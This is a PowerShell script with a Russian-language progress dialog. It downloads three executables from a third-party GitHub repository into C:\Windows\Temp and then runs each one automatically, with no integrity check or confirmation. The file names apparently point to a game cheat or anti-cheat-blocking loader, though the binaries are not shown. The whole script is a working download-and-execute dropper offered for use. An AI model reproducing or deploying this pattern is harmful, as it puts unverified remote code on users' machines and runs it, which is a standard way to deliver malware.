Add-Type -AssemblyName System.Windows.Forms

$downloads = @(
    @{ URL = 'https://github.com/fosslas/users/raw/refs/heads/main/Timeless.exe'; Path = 'C:\Windows\Temp\Timeless.exe' },
    @{ URL = 'https://github.com/fosslas/users/raw/refs/heads/main/timeless_scanner.exe'; Path = 'C:\Windows\Temp\timeless_scanner.exe' },
    @{ URL = 'https://github.com/fosslas/users/raw/refs/heads/main/block_majestic.exe'; Path = 'C:\Windows\Temp\block_majestic.exe' }
)

$form = New-Object System.Windows.Forms.Form
$form.Text = "Загрузка файлов"
$form.Size = New-Object System.Drawing.Size(400, 150)
$form.StartPosition = "CenterScreen"
$form.FormBorderStyle = "FixedDialog"
$form.MaximizeBox = $false

$label = New-Object System.Windows.Forms.Label
$label.Location = New-Object System.Drawing.Point(20, 20)
$label.Size = New-Object System.Drawing.Size(360, 20)
$label.Text = "Подготовка..."
$form.Controls.Add($label)

$progressBar = New-Object System.Windows.Forms.ProgressBar
$progressBar.Location = New-Object System.Drawing.Point(20, 50)
$progressBar.Size = New-Object System.Drawing.Size(360, 25)
$progressBar.Minimum = 0
$progressBar.Maximum = 100
$form.Controls.Add($progressBar)

$percentLabel = New-Object System.Windows.Forms.Label
$percentLabel.Location = New-Object System.Drawing.Point(180, 80)
$percentLabel.Size = New-Object System.Drawing.Size(50, 20)
$percentLabel.Text = "0%"
$form.Controls.Add($percentLabel)

$form.Show()
$form.Refresh()

foreach ($item in $downloads) {
    $name = Split-Path $item.Path -Leaf
    $label.Text = "Скачиваю: $name"
    $progressBar.Value = 0
    $percentLabel.Text = "0%"
    $form.Refresh()

    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

        $req = [System.Net.HttpWebRequest]::Create($item.URL)
        $req.AllowAutoRedirect = $true
        $req.UserAgent = "Mozilla/5.0"
        $response = $req.GetResponse()
        $totalBytes = $response.ContentLength
        $stream = $response.GetResponseStream()
        $fileStream = [System.IO.File]::Create($item.Path)

        $buffer = New-Object byte[] 8192
        $bytesRead = 0
        $totalRead = 0

        while (($bytesRead = $stream.Read($buffer, 0, $buffer.Length)) -gt 0) {
            $fileStream.Write($buffer, 0, $bytesRead)
            $totalRead += $bytesRead

            if ($totalBytes -gt 0) {
                $pct = [int](($totalRead / $totalBytes) * 100)
                $progressBar.Value = $pct
                $percentLabel.Text = "$pct%"
                [System.Windows.Forms.Application]::DoEvents()
            }
        }

        $fileStream.Close()
        $stream.Close()
        $response.Close()

        $label.Text = "Скачано: $name"
        $progressBar.Value = 100
        $percentLabel.Text = "100%"
        $form.Refresh()
    }
    catch {
        [System.Windows.Forms.MessageBox]::Show("Ошибка при загрузке $name`n$($_.Exception.Message)", "Ошибка")
    }
}

$label.Text = "Все файлы скачаны!"
$form.Refresh()
Start-Sleep -Seconds 1
$form.Close()

foreach ($item in $downloads) {
    Start-Process $item.Path
}
